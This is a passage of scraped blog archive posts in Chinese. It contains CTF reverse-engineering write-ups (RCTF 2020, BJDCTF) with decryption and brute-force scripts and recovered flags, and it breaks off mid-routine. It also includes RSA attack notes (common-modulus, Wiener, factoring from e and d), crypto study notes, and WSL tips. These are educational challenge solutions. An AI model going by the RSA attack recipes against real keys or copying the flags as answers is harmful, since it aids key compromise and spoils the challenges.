用rust语言编写代码看着很丑,加密流程却意外简单。。。。\n分析 # 拖进ida一顿操作找到输入,再往后面找到输出错误的函数，下断点改流程发现没有输出 right 于是判断判断正误的字符串在之前被载入了要输出的字符串，于是往回找找到了一个大循环。。。。\n给循环下断点发现里面有明显用来判断数据的 cmp 指令，循环次数刚好是 RCTF{ 的长度。。。。\n更改 RCTF{ 为其他字符判断使用了字符串的函数并跟进观察寄存器的变化，成功找到加密flag的位置\n接下来解比较简单了，先从内存中读出加密用的 key，由于提取密文的函数过于奇怪，干脆修改流程把所有密文记下来。\nexp: # l1=[0x39,0x15,0x22,0xf4,0x95,0x70,0xe5,0x91,0x07,0x3d,0x8d,0xce,0x78,0xc2,0x52,0x9d,0xe1,0x8d,0x2e,0x6e] l=[0x6b,0x56,0x76,0xb2,0xee,0x3,0xb1,0xe3,0x62,0x5c,0xe6,0x91,0x1d,0x93,0x27,0xfc,0x8d,0xf8,0x53,0x64,0xd7,0x25,0xee,0xe3,0xc8,0xab,0x93,0x86,0xa5,0xaf,0x8c,0xaf,0x4a,0xde,0x64,0x33,0x5d,0x18] for i in range(len(l1)): print(chr(l1[i]^l[i]),end=\u0026#39;\u0026#39;) RCTF{sTreak_eQualu}\ncipher # 太痛苦了。。。再也不想看这个题了\n先拖到ghidra里面看伪代码大概复原后是这个样子的\ndemo: # //i j为两个char类型的随机数 x = (i \u0026lt;\u0026lt; 56) | (j \u0026lt;\u0026lt; 48); y = 0; a = (flag2 \u0026gt;\u0026gt; 8) + (flag2 \u0026lt;\u0026lt; 56) + flag1 ^ x; b = (flag1 \u0026gt;\u0026gt; 61) + (flag1 \u0026lt;\u0026lt; 3 ) ^ a; i = 0; while (i \u0026lt; 31) { y = ((y \u0026gt;\u0026gt; 8) + (y \u0026lt;\u0026lt; 56) + x) ^ i; x = ((x \u0026gt;\u0026gt; 61) + (x \u0026lt;\u0026lt; 3)) ^ y; a = ((a \u0026gt;\u0026gt; 8) + (a \u0026lt;\u0026lt; 56) + b) ^ x; b = ((b \u0026gt;\u0026gt; 61) + (b \u0026lt;\u0026lt; 3)) ^ a; i = i + 1; } 注意 x和 y的变化都是由互相的值引起的，故 x 和 y 最终的状态只有 0x100^0x100种。通过爆破i、j可以得到最终的x、y\n爆破demo： # #include\u0026lt;iostream\u0026gt; #include\u0026lt;stdlib.h\u0026gt; using namespace std; int main() { for (uint64_t i = 0; i \u0026lt;= 0xfff; ++i) { for (uint64_t j = 0; j \u0026lt;= 0xfff; ++j) { uint64_t t; uint64_t b = 0x2a00f82be11d77c1; uint64_t a = 0xc3b171fc23d591f4; uint64_t x = (i \u0026lt;\u0026lt; 56) | (j \u0026lt;\u0026lt; 48); uint64_t y = 0; int i=0; while (i\u0026lt;31) { y = ((y \u0026gt;\u0026gt; 8) + (y \u0026lt;\u0026lt; 56) + x) ^ i; x = ((x \u0026gt;\u0026gt; 61) + (x \u0026lt;\u0026lt; 3)) ^ y; i += 1; } uint64_t t1,t2; t1=x; t2=y; i = 31; while (i \u0026gt; 0) { i -= 1; t = a ^ b; b = (t \u0026lt;\u0026lt; 61) + (t \u0026gt;\u0026gt; 3); //b1 t = a ^ x; t -= b; a = (t \u0026lt;\u0026lt; 8) + (t \u0026gt;\u0026gt; 56); t = x ^ y; x = (t \u0026lt;\u0026lt; 61) + (t \u0026gt;\u0026gt; 3); t = (y ^ i); t -= x; y = (t \u0026lt;\u0026lt; 8) + (t \u0026gt;\u0026gt; 56); } t = a ^ b; b = (t \u0026lt;\u0026lt; 61) ^ (t \u0026gt;\u0026gt; 3); t = (a ^ x) - b; a = (t \u0026lt;\u0026lt; 8) + (t \u0026gt;\u0026gt; 56); t = b / 0x1000000; if (t == 0x524354467b) { cout\u0026lt;\u0026lt;hex\u0026lt;\u0026lt;\u0026#34;x=\u0026#34;\u0026lt;\u0026lt;t1\u0026lt;\u0026lt;\u0026#34;;\u0026#34;\u0026lt;\u0026lt;endl\u0026lt;\u0026lt;\u0026#34;y=\u0026#34;\u0026lt;\u0026lt;t2\u0026lt;\u0026lt;\u0026#34;;\u0026#34;\u0026lt;\u0026lt;endl; system(\u0026#34;pause\u0026#34;); } } } system(\u0026#34;pause\u0026#34;); return 0; } 得到x、y\nx = 0x411e3239d455bc70; y = 0x7eb3b6f1136403ac; exp： # #include \u0026lt;iostream\u0026gt; #include \u0026lt;stdlib.h\u0026gt; using namespace std; int main() { uint64_t v[10] = { 0x2a00f82be11d77c1, 0xc3b171fc23d591f4, 0x30f11e8bc2885957, 0xd594ab77422feb75, 0xe15d76f0466e98b9, 0xb651fdb55d7736f2, }; for (int j = 0; j \u0026lt; 3; j++) { uint64_t t; uint64_t b = v[j*2]; uint64_t a = v[j * 2+1]; uint64_t x; uint64_t y; int i = 0; x = 0x411e3239d455bc70; y = 0x7eb3b6f1136403ac; uint64_t t1, t2; t1 = x; t2 = y; i = 31; while (i \u0026gt; 0) { i -= 1; t = a ^ b; b = (t \u0026lt;\u0026lt; 61) + (t \u0026gt;\u0026gt; 3); //b1 t = a ^ x; t -= b; a = (t \u0026lt;\u0026lt; 8) + (t \u0026gt;\u0026gt; 56); t = x ^ y; x = (t \u0026lt;\u0026lt; 61) + (t \u0026gt;\u0026gt; 3); t = (y ^ i); t -= x; y = (t \u0026lt;\u0026lt; 8) + (t \u0026gt;\u0026gt; 56); } t = a ^ b; b = (t \u0026lt;\u0026lt; 61) ^ (t \u0026gt;\u0026gt; 3); t = (a ^ x) - b; a = (t \u0026lt;\u0026lt; 8) + (t \u0026gt;\u0026gt; 56); t = b / 0x1000000; cout \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; b \u0026lt;\u0026lt; a ; } system(\u0026#34;pause\u0026#34;); return 0; } py dome: # import Crypto.Util.number a=0x524354467b393837363233356533613962643639636662366234613364666364626361373066333035346639317d0a00 a = Crypto.Util.number.long_to_bytes(a) print(a) b\u0026rsquo;RCTF{9876235e3a9bd69cfb6b4a3dfcdbca70f3054f91}\n","date":"7 June 2020","permalink":"/achieve/2019to2021/rctf2020%E5%A4%8D%E7%8E%B0wp/","section":"archive","summary":"太马了。。。。","title":"Rctf2020复现wp"},{"content":" 持续更新\n\\; 要写成 \\\\; \\\\[2ex] 要写成\\\\\\\\[2ex] * 星号周围空格 ","date":"6 June 2020","permalink":"/achieve/2019to2021/mathjax%E5%B8%B8%E7%94%A8/","section":"archive","summary":"持续更新","title":"MathJax常用符号使用细节"},{"content":" 花了两天看把基础数论过了一遍，看这些东西的时候理解起来快了很多\n基本类型： # 1. \u0026ldquo;老奶奶用脚都会做\u0026quot;的板子题 # 已知e,p,q求d\n$d$ = $e^{-1}$ mod $\\phi(n)$\n2. 已知e,d,n求p,q # 用已知条件易于求出$N$、$\\phi(n)$,则有\n$$\\begin{cases} N = p * q \\\\[2ex] \\phi(n)=(q-1)(p-1) \\end{cases} $$\n联立得\n$$ \\begin{cases} N-\\phi(n)+1=p+q \\\\[2ex] N=p * q \\end{cases} $$\n引入变量 X 建立一元二次方程（或者直接解二元一次）解出p和q\n也不知道为什么有些地方给的办法那么麻烦。。。\n3.低加解密指数攻击 # 已知c和已知e过小就请直接爆破 低加密指数广播攻击-\u0026gt;套用中国剩余定理模板 低解密指数攻击-\u0026gt;脚本梭哈,试了一下不好用 4.共模攻击 # 若有： $gcd(e_1,e_2)=1$ 且 $$ \\begin{cases} C_1\\equiv M^{e_1} mod;n \\\\[2ex] C_2\\equiv M^{e_2} mod;n \\end{cases} $$\n一定有 $s_1 * e_1+s_2 * e_2= 1$,用扩展欧几里得算出 s1 ，s2\n则有 $ \\begin{cases} C_1^{s_1}\\equiv M^{e_1 * s_1} mod;n \\\\[2ex] C_2^{s_2}\\equiv M^{e_2 * s_2} mod;n \\end{cases} \\quad \\Rightarrow C_1^{s_1} * C_2^{s_2} \\equiv M^{e_1 * s_1 + e_2 * s_2}mod;n \\quad \\Rightarrow C_1^{s_1} * C_2^{s_2} \\equiv M mod;n $\n5.已知dp,dq求解 # 参考 7.5.2 使用中国余数定理快速加解密（CRT）\n6.加密指数过大（e，n接近） # wiener-attack\nwiener脚本\n已知 n,e,d 求 q , p # 比较冷的常规模板 做法比较\u0026hellip;看脸\npaper import random def gcd(a, b): if a \u0026lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return a def getpq(n, e, d): p = 1 q = 1 while p == 1 and q == 1: k = d * e - 1 g = random.randint(0, n) while p == 1 and q == 1 and k % 2 == 0: k /= 2 y = pow(g, k, n) if y != 1 and gcd(y-1, n) \u0026gt; 1: p = gcd(y-1, n) q = n/p return (p, q) def main(): \u0026#39;\u0026#39;\u0026#39; n= e= d= \u0026#39;\u0026#39;\u0026#39; p, q = getpq(n, e, d) print( \u0026#34;p=\u0026#34;+hex(p)) print( \u0026#34;q=\u0026#34;+hex(q)) if __name__ == \u0026#39;__main__\u0026#39;: main() ","date":"6 June 2020","permalink":"/achieve/2019to2021/ctf%E4%B8%ADrsa%E5%A5%97%E8%B7%AF/","section":"archive","summary":"花了两天看把基础数论过了一遍，看这些东西的时候理解起来快了很多","title":"CTF中RSA套路"},{"content":"\r秘钥生成与正确性 # 算法不再赘述\nRSA秘钥生成 # 选择两个大素数 p ,q 计算 $n$ = $p * q$ 计算 $\\phi$( n ) = $( p - 1 )( q - 1 )$ 选择 e $\\in$ $Z^m$ 且 gcd（m，e）= 1 计算私钥 d 满足 d * e = 1 mod $\\phi$(n) RSA 核心原理 # $C^d$ $\\equiv$ $M^{d * e}$ $\\equiv$ $M$ mod $n$\n细节如下：\n$d * e = 1 + t * \\phi(n)$ $M^{d * e}\\equiv M^{1 + t * \\phi(n)}\\equiv M * M^{t * \\phi(n)}\\equiv 1 * M$ mod $n$ 7.5.2 使用中国余数定理快速加解密（CRT） # 约简基元素 $M$：\n$M_p$ $\\equiv$ $M$ mod $p$\n$M_q$ $\\equiv$ $M$ mod $q$\n计算两个指数并进行列出的指数运算\n两个指数：\n$d_p\\equiv d$ mod $(p-1)$\n$d_q\\equiv d$ mod $(q-1)$\n运算：\n$C_p\\equiv M^{d_p}_p$ mod $p$\n$C_q\\equiv M^{d_q}_q$ mod $q$\n逆向换到问题域：\n$C$ $\\equiv$ $C_p * M_p * q$ + $C_q * M_q * p$ mod $n$\n如果要解密也可以用这种算法快速算出结果\n","date":"5 June 2020","permalink":"/achieve/2019to2021/re0%E3%81%AEcrypt2/","section":"archive","summary":"秘钥生成与正确性 # 算法不再赘述","title":"从零开始的深入浅出密码学day 2"},{"content":" 今天深入了解了一下 RSA 背后的一些数学原理\n1.4.1 模运算 # .2 余数的不唯一性 # 例：\n12 $\\equiv$ 3 mod 9 12 $\\equiv$ 21 mod 9 12 $\\equiv$ -6 mod 9 12、3、21、-6都属于一个整数集 {\u0026hellip;-27,-15,-6,3,12,21\u0026hellip;.} 这个整数集构成一个所谓的等价类\n对于模数9来说还拥有另外 8 个等价类\n{\u0026hellip;.-9 ,0 ,9\u0026hellip;.}\n{\u0026hellip;.-8 ,1 ,10\u0026hellip;.}\n. . .\n{\u0026hellip;.-10 ,-1 ,8\u0026hellip;.}\n对于模运算来说,等价类所以成员的行为相同\n1.4.2 环 # 定义 # 假设整数环 Zm 有以下两部分构成：\n集合 Zm = {0 ,1 ,2 \u0026hellip;. m-1} 两种操作符 +、* 使a 、b $\\in$ Zm,有： a + b $\\equiv$ c mod m\na * b $\\equiv$ d mod m\n环中的逆元 # 一般逆元定义：\n一个可以取消另一给定元素运算的元素\n但在这里，乘法逆元定义为：a * a-1 $\\equiv$ 1 mod m\n故 3 * 9 $\\equiv$ 1 mod 26 中 9 是 3 的逆元\ngcd(a ,m) = 1时 Zm 中 a 的逆元存在（互质）\n6.3.2 扩展欧几里得算法(EEA) # gcd()用熟悉的辗转相除法发介绍了如何求最大公因数, EEA 算法则最终可以求得 Zm 中 a 的逆元 （前提是存在逆元）\n设正整数 r0 ， r1 且 r0\u0026gt;r1\nEAA算法最终可以得到两份参数：\ngcd(r0 ,r1) 返回的最大公因数 gcd(r0 ,r1) = s * r1 + t * r0 中的 t 、s 当 gcd( m , a) = 1 时，有 s * m + t * r1 = 1\n则 s * 0 + t * r1 $\\equiv$ 1 mod m\nt 为 r1 的逆元\n几个基础的函数和定理 # 基础中的基础\n欧拉函数 # 返回 Zm 内与 m 互质的整数的个数\n$\\phi$( m ) = $\\prod_1^n$ ( Pie - Pie-1 )\n例\n$\\phi$( 240 ) = 24 * 3 * 5 = ( 24 - 23 )( 3 - 1 )( 5 - 1 ) = 64\n费马小定理 # ap $\\equiv$ a mod p \u0026ndash;\u0026gt; ap-1 $\\equiv$ 1 mod p\n欧拉定理 # a、m都是整数，且互质，则有: a $\\phi$( m ) $\\equiv$ 1 mod m\n","date":"4 June 2020","permalink":"/achieve/2019to2021/re0%E3%81%AEcrypt1/","section":"archive","summary":"今天深入了解了一下 RSA 背后的一些数学原理","title":"从零开始的深入浅出密码学day 1"},{"content":"\r常见几种： # (a \u0026amp; ~(b \u0026amp; a) |~(b \u0026amp; a) \u0026amp; b) (a | b) \u0026amp; ( ~a | ~b ) ~(~a \u0026amp; ~b) \u0026amp; ~(a \u0026amp; b) (a \u0026amp; ~b)|(~a \u0026amp; b) 理论基础： # 收集来的资料里面提到了 反演规则 和 对偶规则\n对于任意一个函数表达式Y，如果把Y中所有的“与”换成“或”，“或”换成“与”；“0”换成“1”，“1”换成“0”；原变量换成反变量，反变量换成原变量，即得到一个新的函数表达式Y非，称Y非为原函数Y的反函数。 对于任何一个逻辑表达式F,如果将式中所有的“·”换成“+”,“+”换成“·”,“0”换成“1”,“1”换成“0”,而变量保持不变就得到表达式F\u0026rsquo;，这个表达式F\u0026rsquo;称为F的对偶式，这一变换方式称为对偶规则。\n以此可见用与、或、非实现异或的方式并不只有上面那几种，只有符合一定的数学原理就可以实现\n等有时间了就去好好研究研究。。。\n","date":"28 May 2020","permalink":"/achieve/2019to2021/%E4%B8%8E%E6%88%96%E9%9D%9E%E8%A1%A8%E7%A4%BA%E5%BC%82%E6%88%96/","section":"archive","summary":"常见几种： # (a \u0026amp; ~(b \u0026amp; a) |~(b \u0026amp; a) \u0026amp; b) (a | b) \u0026amp; ( ~a | ~b ) ~(~a \u0026amp; ~b) \u0026amp; ~(a \u0026amp; b) (a \u0026amp; ~b)|(~a \u0026amp; b) 理论基础： # 收集来的资料里面提到了 反演规则 和 对偶规则","title":"用与、或、非表示异或的几种方式"},{"content":" 如果普通用户无法显示先检查$ ~/.zshrc的权限 真-root无法享受zsh 无法正常显示先检查字体是否出错，字体的名称要打开字体才能看见 windows资源管理器访问wsl系统文件夹可能会改变文件权限，最后还得手动改，很烦 别人的前端永远最好看 ","date":"28 May 2020","permalink":"/achieve/2019to2021/wsl%E7%BE%8E%E5%8C%96/","section":"archive","summary":"如果普通用户无法显示先检查$ ~/.","title":"wsl + zsh进行美化时的注意事项"},{"content":" 我就是铁废物了，整场比赛只做出来两个题\nViQinere # exp找不到了。。。orz 总之连接题目给的ip地址，会返回一串密文，分析一下算法就可以回去开开心心写爆破了\nBScript # 因为队友吧win环境搞没了，所以我就先搞了两个pe文件，不得不说出题人真有你的啊。。。从0开始的文件操作了解一下\n把加密flag的文件拆成800多分，分别放到800多个加了upx壳的文件里面\nemmmm，好吧先脱壳\n脱壳demo： # #include \u0026lt;iostream\u0026gt; #include \u0026lt;stdlib.h\u0026gt; using namespace std; int main() { for(int i=0;i\u0026lt;804;i++) { char x[5]; memset(x, 0, sizeof(x)); itoa(i,x,10); char s[20] = \u0026#34;upx -d BScript/\u0026#34;; strcat( s ,x); char s1[10] = \u0026#34;.exe\u0026#34;; strcat(s, s1); system(s); } //system(s); system(\u0026#34;pause\u0026#34;); } 脱完壳后随便打开几个到ida里面看看，发现不同的文件里面的变量ans或变量key里面放了一小段pe文件的信息\n__main(); puts(\u0026#34;What a easy RE!\u0026#34;); while ( i ) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;v4 + i); if ( *(\u0026amp;v4 + i) != ans[63 - i] )//ans里面倒序放置64个 byte 的信息 { puts(\u0026#34;Are you a fool?\u0026#34;); exit(0); } --i; 然后在写几个demo对所有pe文件的类型分析一下，发现800个文件只有两种不同的大小，相同大小的文件中放pe文件的信息的位置是一样的\nFILE *fp = NULL; fp = fopen(\u0026#34;BScript\\\\1~804.exe\u0026#34; , \u0026#34;rb\u0026#34;); fseek(fp,0,SEEK_END); int size = ftell(fp);//这样可以得到文大小 cheak(size); 文件大小 pe信息位置 长度 0xBE03 0x1C40 64 逆序 0xBDF1 0x1c20 32 正序 然后继续撸脚本把文件提取出来，先新建一个空的“new”文件在执行以下代码\ndemo: # #include \u0026lt;iostream\u0026gt; #include \u0026lt;fstream\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;stdlib.h\u0026gt; using namespace std; int main() { for (int i = 0; i \u0026lt; 804; i++) { char fname[20] = \u0026#34;BScript\\\\\u0026#34;; char s[20]; memset(s, 0, sizeof(s)); itoa(i, s, 10); strcat(fname, s); strcat(fname, \u0026#34;.exe\u0026#34;); char s2[100]; memset(s2, 0, sizeof(s2)); FILE *fr = NULL; fr = fopen(fname, \u0026#34;rb\u0026#34;); fseek(fr,0,SEEK_END); int size = ftell(fr); //printf(\u0026#34;%X\u0026#34;,size); if (size == 48643) { fseek(fr, 0x1C40, SEEK_SET); fread(\u0026amp;s2, 1, 0x40, fr); fclose(fr); FILE *NewFile = NULL; NewFile = fopen(\u0026#34;new\u0026#34;, \u0026#34;ab\u0026#34;); for (int i = 0x40 - 1; i \u0026gt;= 0; i--) fwrite(\u0026amp;s2[i], 1, 1, NewFile); } else if (size == 48625) { fseek(fr, 0x1C20, SEEK_SET); fread(\u0026amp;s2, 1, 0x20, fr); fclose(fr); FILE *NewFile = NULL; NewFile = fopen(\u0026#34;new\u0026#34;, \u0026#34;ab\u0026#34;); for (int i = 0; i \u0026lt; 0x20; i++) fwrite(\u0026amp;s2[i], 1, 1, NewFile); } } system(\u0026#34;pause\u0026#34;); } 原谅弟弟我只会用C语言写文件操作，写的还很丑\n完工后得到 New 拖进ida发现并没有我们苦苦追寻的字符串。。。那就先看看前几个最有希望的函数，果然在前几个函数中发现了我们感兴趣的代码\n在 0x004015C0 处的函数是个标准的base64，交叉引用一下可以小刀输入的位置和判断的位置，进行找一下可以在 0x00401BEE处的函数了找到给密文赋值的语句\n稍微注意一下赋值的地址就可以把密文拼出来了\n0x00401AD7处 int __cdecl fun(int a1) { tab = \u0026#39;Q\u0026#39;; byte_40D041 = \u0026#39;k\u0026#39;; byte_40D042 = \u0026#39;p\u0026#39;; byte_40D043 = \u0026#39;E\u0026#39;; byte_40D044 = \u0026#39;e\u0026#39;; byte_40D045 = \u0026#39;1\u0026#39;; byte_40D046 = \u0026#39;d\u0026#39;; byte_40D047 = \u0026#39;o\u0026#39;; byte_40D048 = \u0026#39;T\u0026#39;; byte_40D049 = \u0026#39;3\u0026#39;; byte_40D04A = \u0026#39;R\u0026#39;; byte_40D04B = \u0026#39;f\u0026#39;; byte_40D04C = \u0026#39;N\u0026#39;; byte_40D04D = \u0026#39;F\u0026#39;; byte_40D04E = \u0026#39;9\u0026#39;; byte_40D04F = \u0026#39;i\u0026#39;; byte_40D050 = \u0026#39;Y\u0026#39;; byte_40D051 = \u0026#39;W\u0026#39;; byte_40D052 = \u0026#39;V\u0026#39;; byte_40D053 = \u0026#39;1\u0026#39;; byte_40D054 = \u0026#39;d\u0026#39;; v1 = sub_401E7C(\u0026#39;2\u0026#39;); v2 = v1; v3 = (_BYTE *)v1; for ( i = 49; i \u0026gt;= 0; --i ) *v3++ = 0; v7 = v2; v5 = sub_401ECC(a1, (int)v3); unk_40E2C0(v7, 41, v5); for ( j = 0; ((int (__cdecl *)(int))dword_407C68[0])(v7) \u0026gt; j; ++j ) ++*(_BYTE *)(j + v7); return v7; } 0x004019FF处 int __usercall fun2@\u0026lt;eax\u0026gt;(int a1@\u0026lt;edx\u0026gt;, int a2, int a3) { f((int)\u0026amp;v4, a1); f_0(a2, a3, (int)\u0026amp;v4); f_1((int)\u0026amp;v4); byte_40D055 = 68; byte_40D056 = 70; byte_40D057 = 109; byte_40D058 = 100; byte_40D059 = 84; byte_40D05A = 70; byte_40D05B = 102; byte_40D05C = 99; byte_40D05D = 50; byte_40D05E = 78; byte_40D05F = 121; byte_40D060 = 98; byte_40D061 = 72; byte_40D062 = 66; byte_40D063 = 48; byte_40D064 = 102; byte_40D065 = 81; byte_40D066 = 65; byte_40D067 = 65; return a2; } 然后就可以撸exp了 不要忘了按出题人的意思把flag转成32位小写md5值\nexp: # import base64 import hashlib l = [\u0026#39;Q\u0026#39;, \u0026#39;k\u0026#39;, \u0026#39;p\u0026#39;, \u0026#39;E\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;T\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;R\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;i\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;W\u0026#39;, \u0026#39;V\u0026#39;, \u0026#39;1\u0026#39;,\u0026#39;d\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;m\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;T\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;H\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;Q\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;A\u0026#39;] s = b\u0026#39;QkpEe1doT3RfNF9iYWV1dDFmdTFfc2NybHB0fQAA\u0026#39; s1 = base64.b64decode(s) print(s1) flag = b\u0026#34;BJD{WhOt_4_baeut1fu1_scrlpt}\u0026#34; #\u0026#34;BJD{WhOt_4_baeut1fu1_scrlpt}\u0026#34; f = hashlib.md5() f.update(flag) print(f.hexdigest()) #e801bcbcc42d3120d910ccc46ae640dd 如果上交buu的话应该是 flag{e801bcbcc42d3120d910ccc46ae640dd}\n以下为复现题目\nBlink: # 这个题做得可以说是相当没有体验了，看到一堆闪瞎狗眼的东西后立马就滚回去补作业了\n观赏了表哥们的wp后我才发现那堆x才是二维码的本体（我一直以为色块是二维码的组成部分）\n中间产生随机数来确定要不要打印x，所以把随机数判断部分patch掉就好了\n为防止手贱前面的屏幕刷新patch掉\n然后运行就会得到这种东西\n复制出来扫一下\n`BJD{TW1NKLE_TW1NKLE_L1TTLE_5TAR}\n宁是来出misc的吧\nlog1cal # 拖进ida动调一下先判断格式和长度\nBJD{64个字符}\n然后后面的位移操作没什么难的，只有重点在加密上面\n头皮发麻的加密： # for ( i = 0; i \u0026lt;= 63; ++i ) { *flag = flag[1] \u0026amp; ~(((*flag \u0026lt;\u0026lt; 28) \u0026amp; ~((*flag \u0026gt;\u0026gt; 36) \u0026amp; (*flag \u0026lt;\u0026lt; 28)) | ~((*flag \u0026gt;\u0026gt; 36) \u0026amp; (*flag \u0026lt;\u0026lt; 28)) \u0026amp; (*flag \u0026gt;\u0026gt; 36)) \u0026amp; flag[1]) | ~(((*flag \u0026lt;\u0026lt; 28) \u0026amp; ~((*flag \u0026gt;\u0026gt; 36) \u0026amp; (*flag \u0026lt;\u0026lt; 28)) | ~((*flag \u0026gt;\u0026gt; 36) \u0026amp; (*flag \u0026lt;\u0026lt; 28)) \u0026amp; (*flag \u0026gt;\u0026gt; 36)) \u0026amp; flag[1]) \u0026amp; ((*flag \u0026lt;\u0026lt; 28) \u0026amp; ~((*flag \u0026gt;\u0026gt; 36) \u0026amp; (*flag \u0026lt;\u0026lt; 28)) | ~((*flag \u0026gt;\u0026gt; 36) \u0026amp; (*flag \u0026lt;\u0026lt; 28)) \u0026amp; (*flag \u0026gt;\u0026gt; 36)); flag[1] = flag[2] \u0026amp; ~(((flag[1] \u0026lt;\u0026lt; 22) \u0026amp; ~((flag[1] \u0026gt;\u0026gt; 42) \u0026amp; (flag[1] \u0026lt;\u0026lt; 22)) | ~((flag[1] \u0026gt;\u0026gt; 42) \u0026amp; (flag[1] \u0026lt;\u0026lt; 22)) \u0026amp; (flag[1] \u0026gt;\u0026gt; 42)) \u0026amp; flag[2]) | ~(((flag[1] \u0026lt;\u0026lt; 22) \u0026amp; ~((flag[1] \u0026gt;\u0026gt; 42) \u0026amp; (flag[1] \u0026lt;\u0026lt; 22)) | ~((flag[1] \u0026gt;\u0026gt; 42) \u0026amp; (flag[1] \u0026lt;\u0026lt; 22)) \u0026amp; (flag[1] \u0026gt;\u0026gt; 42)) \u0026amp; flag[2]) \u0026amp; ((flag[1] \u0026lt;\u0026lt; 22) \u0026amp; ~((flag[1] \u0026gt;\u0026gt; 42) \u0026amp; (flag[1] \u0026lt;\u0026lt; 22)) | ~((flag[1] \u0026gt;\u0026gt; 42) \u0026amp; (flag[1] \u0026lt;\u0026lt; 22)) \u0026amp; (flag[1] \u0026gt;\u0026gt; 42)); flag[2] = flag[3] \u0026amp; ~(((flag[2] \u0026lt;\u0026lt; 16) \u0026amp; ~((flag[2] \u0026gt;\u0026gt; 48) \u0026amp; (flag[2] \u0026lt;\u0026lt; 16)) | ~((flag[2] \u0026gt;\u0026gt; 48) \u0026amp; (flag[2] \u0026lt;\u0026lt; 16)) \u0026amp; (flag[2] \u0026gt;\u0026gt; 48)) \u0026amp; flag[3]) | ~(((flag[2] \u0026lt;\u0026lt; 16) \u0026amp; ~((flag[2] \u0026gt;\u0026gt; 48) \u0026amp; (flag[2] \u0026lt;\u0026lt; 16)) | ~((flag[2] \u0026gt;\u0026gt; 48) \u0026amp; (flag[2] \u0026lt;\u0026lt; 16)) \u0026amp; (flag[2] \u0026gt;\u0026gt; 48)) \u0026amp; flag[3]) \u0026amp; ((flag[2] \u0026lt;\u0026lt; 16) \u0026amp; ~((flag[2] \u0026gt;\u0026gt; 48) \u0026amp; (flag[2] \u0026lt;\u0026lt; 16)) | ~((flag[2] \u0026gt;\u0026gt; 48) \u0026amp; (flag[2] \u0026lt;\u0026lt; 16)) \u0026amp; (flag[2] \u0026gt;\u0026gt; 48)); flag[3] = flag[4] \u0026amp; ~(((flag[3] \u0026lt;\u0026lt; 58) \u0026amp; ~((flag[3] \u0026gt;\u0026gt; 6) \u0026amp; (flag[3] \u0026lt;\u0026lt; 58)) | ~((flag[3] \u0026gt;\u0026gt; 6) \u0026amp; (flag[3] \u0026lt;\u0026lt; 58)) \u0026amp; (flag[3] \u0026gt;\u0026gt; 6)) \u0026amp; flag[4]) | ~(((flag[3] \u0026lt;\u0026lt; 58) \u0026amp; ~((flag[3] \u0026gt;\u0026gt; 6) \u0026amp; (flag[3] \u0026lt;\u0026lt; 58)) | ~((flag[3] \u0026gt;\u0026gt; 6) \u0026amp; (flag[3] \u0026lt;\u0026lt; 58)) \u0026amp; (flag[3] \u0026gt;\u0026gt; 6)) \u0026amp; flag[4]) \u0026amp; ((flag[3] \u0026lt;\u0026lt; 58) \u0026amp; ~((flag[3] \u0026gt;\u0026gt; 6) \u0026amp; (flag[3] \u0026lt;\u0026lt; 58)) | ~((flag[3] \u0026gt;\u0026gt; 6) \u0026amp; (flag[3] \u0026lt;\u0026lt; 58)) \u0026amp; (flag[3] \u0026gt;\u0026gt; 6)); flag[4] = flag[5] \u0026amp; ~(((flag[4] \u0026lt;\u0026lt; 52) \u0026amp; ~((flag[4] \u0026gt;\u0026gt; 12) \u0026amp; (flag[4] \u0026lt;\u0026lt; 52)) | ~((flag[4] \u0026gt;\u0026gt; 12) \u0026amp; (flag[4] \u0026lt;\u0026lt; 52)) \u0026amp; (flag[4] \u0026gt;\u0026gt; 12)) \u0026amp; flag[5]) | ~(((flag[4] \u0026lt;\u0026lt; 52) \u0026amp; ~((flag[4] \u0026gt;\u0026gt; 12) \u0026amp; (flag[4] \u0026lt;\u0026lt; 52)) | ~((flag[4] \u0026gt;\u0026gt; 12) \u0026amp; (flag[4] \u0026lt;\u0026lt; 52)) \u0026amp; (flag[4] \u0026gt;\u0026gt; 12)) \u0026amp; flag[5]) \u0026amp; ((flag[4] \u0026lt;\u0026lt; 52) \u0026amp; ~((flag[4] \u0026gt;\u0026gt; 12) \u0026amp; (flag[4] \u0026lt;\u0026lt; 52)) | ~((flag[4] \u0026gt;\u0026gt; 12) \u0026amp; (flag[4] \u0026lt;\u0026lt; 52)) \u0026amp; (flag[4] \u0026gt;\u0026gt; 12)); flag[5] = flag[6] \u0026amp; ~(((flag[5] \u0026lt;\u0026lt; 46) \u0026amp; ~((flag[5] \u0026gt;\u0026gt; 18) \u0026amp; (flag[5] \u0026lt;\u0026lt; 46)) | ~((flag[5] \u0026gt;\u0026gt; 18) \u0026amp; (flag[5] \u0026lt;\u0026lt; 46)) \u0026amp; (flag[5] \u0026gt;\u0026gt; 18)) \u0026amp; flag[6]) | ~(((flag[5] \u0026lt;\u0026lt; 46) \u0026amp; ~((flag[5] \u0026gt;\u0026gt; 18) \u0026amp; (flag[5] \u0026lt;\u0026lt; 46)) | ~((flag[5] \u0026gt;\u0026gt; 18) \u0026amp; (flag[5] \u0026lt;\u0026lt; 46)) \u0026amp; (flag[5] \u0026gt;\u0026gt; 18)) \u0026amp; flag[6]) \u0026amp; ((flag[5] \u0026lt;\u0026lt; 46) \u0026amp; ~((flag[5] \u0026gt;\u0026gt; 18) \u0026amp; (flag[5] 